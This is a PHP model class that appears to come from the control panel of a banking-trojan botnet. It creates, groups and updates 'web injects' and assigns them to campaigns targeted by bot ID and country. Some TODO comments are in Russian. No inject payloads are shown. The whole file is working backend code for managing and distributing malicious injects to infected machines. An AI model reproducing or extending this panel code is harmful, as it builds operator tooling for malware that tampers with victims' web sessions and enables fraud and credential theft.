<?php

class Model_Webinjects_Main extends Model
{

    public function get_data()
    {

    }

    /**
     * Take list of injects for image it on the page dynamically
     * @return array assoc
     */
    public function getInjectsListForView()
    {
        $injectsList = $this->getDB()->queryRows(' SELECT id,name FROM webinjects_injects');
        return $injectsList;
    }

    /**
     * Take list of groups for image it on the page dynamically
     * @return array assoc
     */
    public function getGroupsListForView()
    {
        $groupsList = $this->getDB()->queryRows(' SELECT id,name FROM webinjects_groups');
        return $groupsList;
    }

    /**
     * Take info about inject by id
     * @return string json encoded assoc array
     */
    public function getInjectInfo()
    {
        $inject = $this->getDB()->queryRow('SELECT id, name, description, source FROM webinjects_injects WHERE id=:id', array(':id' => $this->request_data['id']));
        return json_encode($inject);
    }

    /**
     * Take info about group by id
     * @return string json encoded assoc array
     */
    public function getGroupInfo()
    {
        $group = $this->getDB()->queryRow('SELECT id, name, description FROM webinjects_groups WHERE id=:id', array(':id' => $this->request_data['id']));
        $injectsInGroup = $this->getDB()->queryRows(
            'SELECT webinjects_groups_injects.inject_id as id, webinjects_injects.name FROM webinjects_groups_injects, webinjects_injects 
                    WHERE webinjects_groups_injects.group_id=:group_id AND webinjects_injects.id = webinjects_groups_injects.inject_id',
            array(':group_id' => $this->request_data['id']));
        $group['injects'] = $injectsInGroup;
        return json_encode($group);
    }

    /**
     * Take excluded injects
     * @return string
     */
    public function getExcludedInjects()
    {
        // TODO: optimize sql request!
        $allInjects = $this->getDB()->queryRows(' SELECT id,name FROM webinjects_injects');
        $injectsInGroup = $this->getDB()->queryValues('SELECT inject_id FROM webinjects_groups_injects WHERE group_id=:group_id', array(':group_id' => $this->request_data['group_id']));
        $excludedInjects = array();
        foreach ($allInjects as $inject) {
            if (!in_array((int)$inject['id'], $injectsInGroup, false)) {
                $excludedInjects[] = $inject;
            }
        }
        return json_encode($excludedInjects);
    }

    /**
     * Select injections from db into DataTables
     * @return string json encoded array
     */
    public function getInjectsList()
    {
        $table = 'webinjects_injects';
        $primaryKey = 'id';
        $columns = array(
            array(
                'db' => 'id',
                'dt' => 'DT_RowId',
                'formatter' => function( $d, $row ) {
                    return 'row_'.$d;
                }
            ),
            array(
                'db' => 'name',
                'dt' => 0
            ),
            array(
                'db' => 'description',
                'dt' => 1
            ),
            array(
                'db' => 'id',
                'dt' => 2,
                'formatter' => function($d, $row) {
                    return '<div style="cursor: pointer;" class="td-edit" data-edit-inject-id="' . $row['id'] .'"><i class="fa fa-edit"></i></div>';
                }
            )
        );

        $sql_details = array(
            'user' => DATABASE_USER_NAME,
            'pass' => DATABASE_USER_PASSWORD,
            'db'   => DATABASE_NAME,
            'host' => 'localhost'
        );

        return json_encode(SSP::simple($this->request_data, $sql_details, $table, $primaryKey, $columns));
    }

    /**
     * Select groups of injections from db into DataTables
     * @return string json encoded array
     */
    public function getGroupsList()
    {
        $table = 'webinjects_groups';
        $primaryKey = 'id';
        $columns = array(
            array(
                'db' => 'name',
                'field' => 'name',
                'exclude' => false,
                'dt' => 0
            ),
            array(
                'db' => 'description',
                'field' => 'description',
                'exclude' => false,
                'dt' => 1
            ),
            array(
                'db' => 'count',
                'field' => 'count',
                'exclude' => true,
                'dt' => 2
            ),
            array(
                'db' => 'id',
                'field' => 'id',
                'dt' => 3,
                'exclude' => false,
                'formatter' => function($d, $row) {
                    return '<div style="cursor: pointer;" class="td-edit" data-edit-group-id="' . $row['id'] .'"><i class="fa fa-edit"></i></div>';
                }
            )
        );

        $sql_details = array(
            'user' => DATABASE_USER_NAME,
            'pass' => DATABASE_USER_PASSWORD,
            'db'   => DATABASE_NAME,
            'host' => 'localhost'
        );

        $joinQuery = ", (SELECT COUNT(*) FROM webinjects_groups_injects as groups_inj WHERE groups.id = groups_inj.group_id) as count FROM webinjects_groups as groups";
        return json_encode(SSP_CUSTOM::simple($this->request_data, $sql_details, $table, $primaryKey, $columns, $joinQuery));
    }

    /**
     * Select campaigns from db into DataTables
     * @return string json encoded array
     */
    public function getCampaignsList()
    {
        $table = 'webinjects_campaigns';
        $primaryKey = 'id';
        $columns = array(
            array(
                'db' => 'name',
                'field' => 'name',
                'exclude' => false,
                'dt' => 0
            ),
            array(
                'db' => 'description',
                'field' => 'description',
                'exclude' => false,
                'dt' => 1
            ),
            array(
                'db' => 'injects_count',
                'field' => 'injects_count',
                'exclude' => true,
                'dt' => 2,
                'formatter' => function($d, $row) {
                    return $row['groups_injects_count'] > 0 ? $row['groups_injects_count'] : $row['injects_count'];
                }
            ),
            array(
                'db' => 'id',
                'field' => 'id',
                'exclude' => false,
                'dt' => 3,
                'formatter' => function($d, $row) {
                    return '<div style="cursor: pointer;" class="td-edit" data-edit-campaign-id="' . $row['id'] .'"><i class="fa fa-edit"></i></div>';
                }
            )
        );

        $sql_details = array(
            'user' => DATABASE_USER_NAME,
            'pass' => DATABASE_USER_PASSWORD,
            'db'   => DATABASE_NAME,
            'host' => 'localhost'
        );

        $joinQuery =
            ", (SELECT COUNT(*) FROM webinjects_campaigns_injects as campaigns_inj WHERE campaigns.id = campaigns_inj.campaign_id) as injects_count, " .
            "(SELECT COUNT(*) FROM webinjects_groups_injects as group_inj WHERE campaigns.group_id = group_inj.group_id) as groups_injects_count " .
            "FROM webinjects_campaigns as campaigns";
        return json_encode(SSP_CUSTOM::simple($this->request_data, $sql_details, $table, $primaryKey, $columns, $joinQuery));
    }

    /**
     * Insert new inject into inject's table
     * @return bool|null id of inserted record
     */
    public function createInject()
    {
        if (!empty($this->request_data['name']) && !empty($this->request_data['source']))
        {
            $dataForInsert = array(
                'name' => $this->request_data['name'],
                'source' => $this->request_data['source']
            );
            if (!empty($this->request_data['description'])) {
                $dataForInsert['description'] = $this->request_data['description'];
            }
            $insertedId = $this->getDB()->insert('webinjects_injects', $dataForInsert);
            return $insertedId;
        }
        return false;
    }

    /**
     * Update inject by id
     * @return bool updates result
     */
    public function updateInject()
    {
        if (!empty($this->request_data['id'])) {
            $dataForUpdate = array();
            if (!empty($this->request_data['name'])) $dataForUpdate['name'] = $this->request_data['name'];
            if (!empty($this->request_data['source'])) $dataForUpdate['source'] = $this->request_data['source'];
            // if (!empty($this->request_data['description'])) $dataForUpdate['description'] = $this->request_data['description'];
            $dataForUpdate['description'] = $this->request_data['description']; // can be null

            if(!empty($dataForUpdate)) {
                $rows = $this->getDB()->update('webinjects_injects', $dataForUpdate,
                    'id=:id', array(':id' => $this->request_data['id']));
                if (!empty($rows))
                    return true;
            }
        }
        return false;
    }

    /**
     * Insert new campaign
     * @return bool result of the insert
     */
    public function createCampaign()
    {
        if (!$this->campaignInfoIsValid())
        {
            return false;
        }

        list($dataForInsert, $injects_ids) = $this->getCampaignDataFromRequest();

        $campaignId = $this->getDB()->insert('webinjects_campaigns', $dataForInsert);

        if (!$campaignId)
        {
            return false;
        }

        if (!empty($injects_ids))
        {
            $this->addInjectsToCampaign($campaignId, $injects_ids);
        }

        return true;
    }

    // TODO: забрать джойном список всех инжектов для выдачи. Сгенерировать список из отмеченных инжектов и всех остальных
    public function getCampaignInfo()
    {
        $campaign = $this->getDB()->queryRow('SELECT id, name, description, botids, countries, group_id FROM webinjects_campaigns WHERE id=:id', array(':id' => $this->request_data['id']));

        $allInjects = $this->getDB()->queryRows(' SELECT id,name FROM webinjects_injects');

        if (empty((int)$campaign['group_id']))
        {
            foreach ($allInjects as $injectInd => $inject)
            {
                $injectIsExist = $this->getDB()->queryValue(
                    'SELECT COUNT(id) FROM webinjects_campaigns_injects WHERE campaign_id = :campaign_id AND inject_id = :inject_id',
                    array(':campaign_id' => $campaign['id'], ':inject_id' => $inject['id']));
                $allInjects[$injectInd]['checked'] = $injectIsExist > 0;
            }
        }

        $allGroups = $this->getDB()->queryRows(' SELECT id,name FROM webinjects_groups');

        foreach($allGroups as $groupInd => $group)
        {
            $allGroups[$groupInd]['selected'] = $group['id'] === $campaign['group_id'];
        }

        $campaign['injects'] = $allInjects;
        $campaign['groups'] = $allGroups;

        return json_encode($campaign);
    }

    public function updateCampaignInfo()
    {
        if (empty($this->request_data['id']))
        {
            return false;
        }

        $campaignId = $this->request_data['id'];

        if (!$this->campaignInfoIsValid())
        {
            return false;
        }

        list($campaignData, $injectsIds) = $this->getCampaignDataFromRequest();

        // Clear old data
        $this->getDB()->update('webinjects_campaigns', array('group_id' => '0'),
            'id=:id', array(':id' => $campaignId));
        $this->getDB()->delete('webinjects_campaigns_injects', 'campaign_id=:campaign_id', array(':campaign_id' => $campaignId));

        $this->getDB()->update('webinjects_campaigns', $campaignData,
            'id=:id', array(':id' => $campaignId));

        if (!empty($injectsIds))
        {
            $this->addInjectsToCampaign($this->request_data['id'], $injectsIds);
        }
        return true;
    }

    // TODO: передавать внутрь запрос
    private function getCampaignDataFromRequest()
    {
        $injects_ids = array();

        $dataForInsert = array(
            'name' => $this->request_data['name']
        );

        if (!empty($this->request_data['group_id'])) {
            $dataForInsert['group_id'] = $this->request_data['group_id'];
        }

        if (!empty($this->request_data['injects'])) {
            $injects_ids = json_decode($this->request_data['injects'], true);
        }

        if (!empty($this->request_data['description'])) {
            $dataForInsert['description'] = $this->request_data['description'];
        }

        if (!empty($this->request_data['botids']) || $this->request_data['botids'] === '0') {
            $dataForInsert['botids'] = $this->request_data['botids'];
        }

        if (!empty($this->request_data['countries']) || $this->request_data['countries'] === '0') {
            $dataForInsert['countries'] = $this->request_data['countries'];
        }

        return [$dataForInsert, $injects_ids];
    }

    // TODO: передавать внутрь запрос
    private function campaignInfoIsValid()
    {
        $injects_ids = array();

        if (empty($this->request_data['name'])) return false;

        if (empty($this->request_data['injects']) && empty($this->request_data['group_id'])) return false;

        if (!empty($this->request_data['injects'])) {
            $injects_ids = json_decode($this->request_data['injects'], true);
        }

        if (empty($injects_ids) && empty($this->request_data['group_id'])) return false;

        return true;
    }

    /**
     * Insert new inject's group
     * @return bool|null inserted id or false
     */
    public function createGroup()
    {
        if (!empty($this->request_data['name']))
        {
            $dataForInsert = array(
                'name' => $this->request_data['name']
            );
            if (!empty($this->request_data['description'])) {
                $dataForInsert['description'] = $this->request_data['description'];
            }
            $insertedId = $this->getDB()->insert('webinjects_groups', $dataForInsert);
            if ($insertedId) {
                $injects_ids = json_decode($this->request_data['injects'], true);
                if (!empty($injects_ids)) {
                    $this->addInjectsToGroup($insertedId, $injects_ids);
                }
            }
            return $insertedId;
        }
        return false;
    }

    /**
     * Update info about group
     * @return bool result of the update
     */
    public function updateGroup()
    {
        if (!empty($this->request_data['id'])) {
            $dataForUpdate = array();
            if (!empty($this->request_data['name'])) $dataForUpdate['name'] = $this->request_data['name'];
            // if (!empty($this->request_data['description'])) $dataForUpdate['description'] = $this->request_data['description'];
            $dataForUpdate['description'] = $this->request_data['description']; // can be null

            if(!empty($dataForUpdate)) {
                $rows = $this->getDB()->update('webinjects_groups', $dataForUpdate,
                    'id=:id', array(':id' => $this->request_data['id']));
                if (!empty($rows))
                    return true;
            }
        }
        return false;
    }

    /**
     * Add selected injects to group
     * @param $group_id int
     * @param $injects_ids array (ids)
     * @return bool result of the inserts
     */
    public function addInjectsToGroup($group_id, $injects_ids)
    {
        $countOfInserts = 0;
        foreach ($injects_ids as $inject_id) {
            $isInjectExist = $this->getDB()->queryValue('SELECT COUNT(*) FROM webinjects_groups_injects WHERE group_id=:group_id AND inject_id=:inject_id',
                array(':group_id' => $group_id, ':inject_id' => $inject_id));
            if (!$isInjectExist) {
                if ($this->getDB()->insert('webinjects_groups_injects', array('group_id' => $group_id, 'inject_id' => $inject_id)) <= 0) {
                    return false;
                }
                $countOfInserts++;
            }
        }
        if ($countOfInserts > 0)
            return true;
        return false;
    }

    public function addInjectToGroup()
    {
        // TODO: Check group and inject existence
        return $this->addInjectsToGroup($this->request_data['group_id'], array($this->request_data['inject_id']));
    }

    public function deleteInjectFromGroup()
    {
        $deleteResult = $this->getDB()->delete('webinjects_groups_injects', 'group_id=:group_id AND inject_id=:inject_id',
            array(
                ':group_id' => $this->request_data['group_id'],
                ':inject_id' => $this->request_data['inject_id'])
            );
        if ($deleteResult > 0)
            return true;
        return false;
    }

    /**
     * Delete inject from DB with with dependencies
     * @return bool result of the delete
     */
    public function deleteInject()
    {
        if (empty($this->request_data['inject_id']))
            return false;

        $this->getDB()->delete('webinjects_injects', 'id=:id', array(':id' => $this->request_data['inject_id']));
        return true;
    }

    /**
     * Add selected injects to campaign
     * @param $campaign_id int
     * @param $injects_ids array (ids)
     * @return bool result of the inserts
     */
    private function addInjectsToCampaign($campaign_id, $injects_ids)
    {
        foreach ($injects_ids as $inject_id) {
            if ($this->getDB()->insert('webinjects_campaigns_injects', array('campaign_id' => $campaign_id, 'inject_id' => $inject_id)) <= 0)
                return false;
        }
        return true;
    }
}